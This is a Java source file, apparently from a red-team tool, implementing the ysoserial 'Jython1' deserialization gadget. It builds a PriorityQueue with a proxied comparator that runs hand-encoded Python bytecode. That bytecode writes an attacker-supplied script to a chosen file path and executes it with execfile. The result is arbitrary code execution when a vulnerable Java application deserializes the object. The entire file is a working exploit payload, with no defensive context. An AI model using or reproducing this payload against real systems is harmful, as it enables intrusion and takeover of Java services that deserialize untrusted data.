package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.PayloadTest;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Reflections;
import org.apache.commons.io.FileUtils;
import org.python.core.PyBytecode;
import org.python.core.PyFunction;
import org.python.core.PyObject;
import org.python.core.PyString;
import org.python.core.PyStringMap;

import java.io.File;
import java.lang.reflect.Proxy;
import java.math.BigInteger;
import java.util.Arrays;
import java.util.Comparator;
import java.util.PriorityQueue;

@PayloadTest(skip = "non RCE")
@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Dependencies({"org.python:jython-standalone:2.5.2"})
@Authors({Authors.PWNTESTER, Authors.CSCHNEIDER4711})
public class Jython1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {

    @Override
    public PriorityQueue getObject(String command) throws Exception {
        String[] paths = command.split(";");
        if (paths.length != 2) {
            throw new IllegalArgumentException("Unsupported command " + command + " " + Arrays.toString(paths));
        }

        String pythonCode = FileUtils.readFileToString(new File(paths[0]), "UTF-8");

        String code =
                "740000" +
                "640100" +
                "640200" +
                "830200" +
                "7D0000" +
                "7C0000" +
                "690100" +
                "640300" +
                "830100" +
                "01" +
                "7C0000" +
                "690200" +
                "830000" +
                "01" +
                "740300" +
                "640100" +
                "830100" +
                "01" +
                "640000" +
                "53";

        PyObject[] consts = new PyObject[]{
                new PyString(""),
                new PyString(paths[1]),
                new PyString("w+"),
                new PyString(pythonCode)
        };
        String[] names = new String[]{"open", "write", "close", "execfile"};

        PyBytecode codeObject = new PyBytecode(2, 2, 10, 64, "", consts, names,
                new String[]{"", ""}, "noname", "<module>", 0, "");
        Reflections.setFieldValue(codeObject, "co_code", new BigInteger(code, 16).toByteArray());

        PyFunction handler = new PyFunction(new PyStringMap(), null, codeObject);
        Comparator comparator = (Comparator) Proxy.newProxyInstance(
                Comparator.class.getClassLoader(),
                new Class<?>[]{Comparator.class},
                handler
        );

        PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        Object[] queue = new Object[]{1, 1};
        Reflections.setFieldValue(priorityQueue, "queue", queue);
        Reflections.setFieldValue(priorityQueue, "size", 2);
        return priorityQueue;
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Jython1.class, args);
    }
}
